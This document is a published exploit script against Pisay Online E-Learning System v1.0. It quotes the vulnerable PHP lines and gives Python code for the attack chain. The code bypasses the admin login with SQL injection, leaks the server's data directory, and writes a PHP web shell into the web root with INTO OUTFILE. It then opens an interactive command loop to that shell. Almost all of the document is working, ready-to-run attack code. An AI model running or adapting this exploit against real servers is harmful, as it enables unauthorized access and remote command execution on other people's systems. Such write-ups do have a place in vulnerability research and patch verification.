# Exploit Author: Bobby Cooke
# Vendor Homepage: https://www.sourcecodester.com/php/14192/pisay-online-e-learning-system-using-phpmysql.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/donbermoy/e-learningsystem_0.zip
# Version: 1.0
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
# Description: Pisay Online E-Learning System v1.0 - SQLi Auth Bypass + Remote Code Execution (RCE)

# Vulnerable Source Code:
# /e-learningsystem/admin/login.php
#  121   $email = trim($_POST[&#039;user_email&#039;]);
#  122   $upass  = trim($_POST[&#039;user_pass&#039;]);
#  123   $h_upass = sha1($upass);
#  132     $user = new User();
#  134     $res = $user::userAuthentication($email, $h_upass);
# /e-learningsystem/include/accounts.php
#    3 class User {
#   23     static function userAuthentication($email,$h_pass){
#   25         $mydb->setQuery("SELECT * FROM `tblusers` WHERE `UEMAIL` = &#039;". $email ."&#039; and `PASS` = &#039;". $h_pass ."&#039;");
# /e-learningsystem/admin/modules/lesson/edit.php
#    6   @$id = $_GET[&#039;id&#039;];
#    7     if($id==&#039;&#039;){
#   10   $lesson = New Lesson();
#   11   $res = $lesson->single_lesson($id);
# /e-learningsystem/include/lessons.php
#    4  class Lesson {
#    5     protected static  $tblname = "tbllesson";
#   35     function single_lesson($id=0){
#   37-38          $mydb->setQuery("SELECT * FROM ".self::$tblname." Where LessonID= &#039;{$id}&#039; LIMIT 1");

import requests, sys, re

requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL):
    try:
        while True:
            cmd = raw_input(&#039;C:\\ &#039;)
            command = {&#039;cmd&#039;: cmd}
            r2 = s.get(SERVER_URL+&#039;../../../../webshell.php&#039;, params=command, verify=False)
            response = r2.text
            cleanResponse = response.replace(&#039;AAAAAAAAAAAAAAA&#039;, &#039;&#039;)
            cleanResponse = cleanResponse.replace(&#039;313371337&#039;, &#039;&#039;)
            print(cleanResponse)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "(+) Usage:   %s <SERVER_URL>" % sys.argv[0]
        print "(+) Example: %s &#039;https://10.0.0.3:443/e-learningsystem/&#039;" % sys.argv[0]
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    ADMIN_URL = SERVER_URL + &#039;admin/login.php&#039;
    LESSON_URL = SERVER_URL + &#039;admin/modules/lesson/index.php&#039;
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    payload1 = {&#039;user_email&#039;: "boku&#039; OR 1337=1337 LIMIT 1 -- PowerUp", &#039;user_pass&#039;: &#039;InstantTransmission&#039;, &#039;btnLogin&#039;: &#039;&#039;}
    s.post(ADMIN_URL, data=payload1, verify=False)

    payload2 = {&#039;view&#039;: &#039;edit&#039;, &#039;id&#039;: &#039;31337\&#039; AND 1337=31337 union all select 313371337,"AAAAAAAAAAAAAAA",@@datadir,"AAAAAAAAAAAAAAA","AAAAAAAAAAAAAAA" -- kamahamaha&#039;}
    r1 = s.get(LESSON_URL, params=payload2, verify=False)
    dirtyPath = str(re.findall(r&#039;"Title" type="text" value=".*>&#039;, r1.text))
    dataPath=re.sub(&#039;^.*"Title" type="text" value="&#039;, &#039;&#039;, dirtyPath)
    dataPath=re.sub(&#039;">.*$&#039;, &#039;&#039;, dataPath)
    dataPath=dataPath.replace(&#039;\\\\&#039;, &#039;/&#039;)
    xamppPath=re.sub(&#039;xampp.*&#039;, &#039;xampp&#039;, dataPath)
    payload3 = {&#039;view&#039;: &#039;edit&#039;, &#039;id&#039;: &#039;31337\&#039; AND 1337=31337 union all select 313371337,"AAAAAAAAAAAAAAA","<?php echo shell_exec($_GET[\&#039;cmd\&#039;]);?>","AAAAAAAAAAAAAAA","AAAAAAAAAAAAAAA" into OUTFILE \&#039;&#039;+xamppPath+&#039;/htdocs/webshell.php\&#039; -- kamahamaha&#039;}
    print(payload3)
    s.get(LESSON_URL, params=payload3, verify=False)
    webshell(SERVER_URL)

